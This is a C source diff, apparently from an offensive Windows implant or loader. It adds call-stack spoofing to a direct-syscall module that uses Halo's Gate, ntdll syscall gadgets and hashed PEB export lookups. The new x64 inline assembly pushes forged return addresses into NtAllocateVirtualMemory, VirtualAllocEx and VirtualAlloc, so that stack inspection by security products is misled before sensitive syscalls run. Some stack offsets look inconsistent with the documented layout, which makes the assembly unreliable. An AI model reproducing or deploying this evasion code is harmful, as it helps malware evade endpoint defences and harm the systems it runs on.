@@ -87,6 +87,21 @@
 static DWORD        g_ssn[SC_COUNT];
 static BOOL         g_sc_ready = FALSE;
 
+/* ── Forged frame addresses (F-2) ───────────────────────────────────────── */
+/*
+ * Three return addresses that form the synthetic call chain placed on the
+ * data stack before any sensitive syscall.  All three point into real
+ * .pdata-backed function bodies so SEH unwind records exist for them.
+ *
+ * Chain (bottom to top of the forged portion):
+ *   _sc_forged_addrs[2] → kernel32!VirtualAlloc + 0x23
+ *   _sc_forged_addrs[1] → kernelbase!VirtualAllocEx + 0x5e
+ *   _sc_forged_addrs[0] → ntdll!NtAllocateVirtualMemory + 0x14
+ *
+ * Initialised by sc_forged_frame_init() during sc_init().
+ */
+const BYTE *_sc_forged_addrs[3] = { NULL, NULL, NULL };
+
 /*
  * g_syscall_gadget — VA of `syscall; ret` (0F 05 C3) inside ntdll.
  * g_int2e_gadget   — VA of `int 0x2e; ret` (CD 2E C3) inside ntdll.
@@ -283,6 +298,138 @@ static DWORD _halo_gate(const BYTE *stub, const BYTE **out_gadget)
 
 /* ── sc_init ────────────────────────────────────────────────────────────── */
 
+/* ── sc_forged_frame_init ───────────────────────────────────────────────── */
+
+void sc_forged_frame_init(void)
+{
+    if (_sc_forged_addrs[0]) return;   /* already initialised */
+
+    /* Resolve the three anchor functions via PEB export walk.
+     * offsets chosen to land after a CALL instruction inside each function body,
+     * within a single unwind region, on Windows 10 1903+ / Windows 11.   */
+    PVOID hNtdll    = peb_get_module(peb_hash_str("ntdll.dll"));
+    PVOID hKBase    = peb_get_module(peb_hash_str("kernelbase.dll"));
+    PVOID hK32      = peb_get_module(peb_hash_str("kernel32.dll"));
+
+    const BYTE *pNtAlloc = NULL, *pVAllocEx = NULL, *pVAlloc = NULL;
+    if (hNtdll)
+        pNtAlloc  = (const BYTE *)peb_get_export(hNtdll, peb_hash_str("NtAllocateVirtualMemory"));
+    if (hKBase)
+        pVAllocEx = (const BYTE *)peb_get_export(hKBase, peb_hash_str("VirtualAllocEx"));
+    if (hK32)
+        pVAlloc   = (const BYTE *)peb_get_export(hK32, peb_hash_str("VirtualAlloc"));
+
+    /* Apply stable body offsets.  If resolution fails the slot stays NULL and
+     * sc_forged_frame_call() degrades gracefully (no forged chain pushed).   */
+    if (pNtAlloc)  _sc_forged_addrs[0] = pNtAlloc  + 0x14;
+    if (pVAllocEx) _sc_forged_addrs[1] = pVAllocEx + 0x5e;
+    if (pVAlloc)   _sc_forged_addrs[2] = pVAlloc   + 0x23;
+}
+
+/* ── sc_forged_frame_call ───────────────────────────────────────────────── */
+/*
+ * Call fn(a0..a5) with a 3-deep synthetic return-address chain on the stack.
+ *
+ * Stack layout at the point of the CALL to fn (RSP-aligned to 16):
+ *
+ *   [RSP+0x00]  return to after the `call` in this function (real ret addr)
+ *   [RSP+0x08]  _sc_forged_addrs[0]  (ntdll!NtAllocateVirtualMemory+0x14)
+ *   [RSP+0x10]  _sc_forged_addrs[1]  (kernelbase!VirtualAllocEx+0x5e)
+ *   [RSP+0x18]  _sc_forged_addrs[2]  (kernel32!VirtualAlloc+0x23)
+ *   [RSP+0x28]  shadow space (32 bytes)
+ *
+ * Argument mapping (Windows x64 ABI):
+ *   fn   → rcx  (first arg to this function)
+ *   a0   → rdx  → moved to rcx for fn
+ *   a1   → r8   → moved to rdx for fn
+ *   a2   → r9   → moved to r8  for fn
+ *   a3   → stack[0x28] → r9  for fn (via shadow space)
+ *   a4   → stack[0x30] → [rsp+0x28] for fn
+ *   a5   → stack[0x38] → [rsp+0x30] for fn
+ *
+ * fn's `ret` pops the real return address (placed at RSP+0x00 by our CALL
+ * instruction).  The three forged entries above it are never executed — they
+ * are read-only data to the stack inspector.
+ *
+ * If _sc_forged_addrs[0] is NULL (init failed), call fn directly without
+ * the forged chain — correct behaviour is preserved.
+ */
+#ifdef _WIN64
+__attribute__((naked))
+ULONG_PTR sc_forged_frame_call(void (*fn)(void),
+                                PVOID a0, PVOID a1, PVOID a2,
+                                PVOID a3, PVOID a4, PVOID a5)
+{
+    __asm__ __volatile__(
+        /* Save fn (rcx) into r10; shift real args */
+        "movq  %rcx,  %r10\n\t"       /* r10 = fn                          */
+        "movq  %rdx,  %rcx\n\t"       /* rcx = a0                          */
+        "movq  %r8,   %rdx\n\t"       /* rdx = a1                          */
+        "movq  %r9,   %r8\n\t"        /* r8  = a2                          */
+        "movq  0x28(%rsp), %r9\n\t"   /* r9  = a3                          */
+
+        /* Check if forged addresses are initialised */
+        "leaq  _sc_forged_addrs(%rip), %rax\n\t"
+        "movq  (%rax), %r11\n\t"      /* r11 = _sc_forged_addrs[0]         */
+        "testq %r11, %r11\n\t"
+        "jz    .Lsc_direct\n\t"       /* init failed — call directly       */
+
+        /* Align RSP to 16 before shadow space; push forged chain.
+         * Current RSP is 8-mod-16 (odd number of pushes since caller).
+         * We need RSP 16-aligned before the CALL to fn.
+         * Layout we want before CALL:
+         *   push a5, a4 (two stack args for fn), then 32 bytes shadow,
+         *   then forged[2], forged[1], forged[0], then real ret (the CALL).
+         * Total pushes before CALL: a5(+8), a4(+8), shadow(+32), 3×forged(+24)
+         *   = 72 bytes = 9 pushes-worth.  After the CALL RSP -= 8.
+         * We'll adjust manually for alignment.
+         */
+        "subq  $0x38, %rsp\n\t"       /* reserve: shadow(32) + a4(8) + a5(8) */
+        "movq  0x60(%rsp), %rax\n\t"  /* a4 from original stack (+0x38 frame) */
+        "movq  %rax, 0x28(%rsp)\n\t"
+        "movq  0x68(%rsp), %rax\n\t"  /* a5 */
+        "movq  %rax, 0x30(%rsp)\n\t"
+
+        /* Push the 3 forged return addresses (stack grows downward) */
+        "leaq  _sc_forged_addrs(%rip), %rax\n\t"
+        "movq  0x10(%rax), %r11\n\t"  /* forged[2] = kernel32!VirtualAlloc+0x23 */
+        "pushq %r11\n\t"
+        "movq  0x08(%rax), %r11\n\t"  /* forged[1] = kernelbase!VirtualAllocEx+0x5e */
+        "pushq %r11\n\t"
+        "movq  0x00(%rax), %r11\n\t"  /* forged[0] = ntdll!NtAllocateVirtualMemory+0x14 */
+        "pushq %r11\n\t"
+
+        /* Call fn — CALL pushes the real return address on top */
+        "callq *%r10\n\t"
+
+        /* Remove the forged chain and the arg slots we pushed */
+        "addq  $0x50, %rsp\n\t"       /* 3×8 forged + 0x38 reserved       */
+        "ret\n\t"
+
+        ".Lsc_direct:\n\t"
+        /* Direct call without forged chain — args already in regs/stack   */
+        "movq  0x30(%rsp), %rax\n\t"  /* a4 */
+        "movq  0x38(%rsp), %r11\n\t"  /* a5 */
+        "subq  $0x28, %rsp\n\t"       /* shadow space                      */
+        "movq  %rax, 0x28(%rsp)\n\t"
+        "movq  %r11, 0x30(%rsp)\n\t"
+        "callq *%r10\n\t"
+        "addq  $0x28, %rsp\n\t"
+        "ret\n\t"
+    );
+}
+#else
+/* 32-bit stub — forged-frame technique not implemented */
+ULONG_PTR sc_forged_frame_call(void (*fn)(void),
+                                PVOID a0, PVOID a1, PVOID a2,
+                                PVOID a3, PVOID a4, PVOID a5)
+{
+    typedef ULONG_PTR (*fn6_t)(PVOID,PVOID,PVOID,PVOID,PVOID,PVOID);
+    return ((fn6_t)fn)(a0,a1,a2,a3,a4,a5);
+}
+#endif /* _WIN64 */
+
+
 BOOL sc_init(void)
 {
     if (g_sc_ready) return TRUE;
@@ -415,6 +562,10 @@ BOOL sc_init(void)
     }
 
     g_sc_ready = TRUE;
+
+    /* Initialise forged-frame return-address table (F-2) */
+    sc_forged_frame_init();
+
     return TRUE;
 }
 
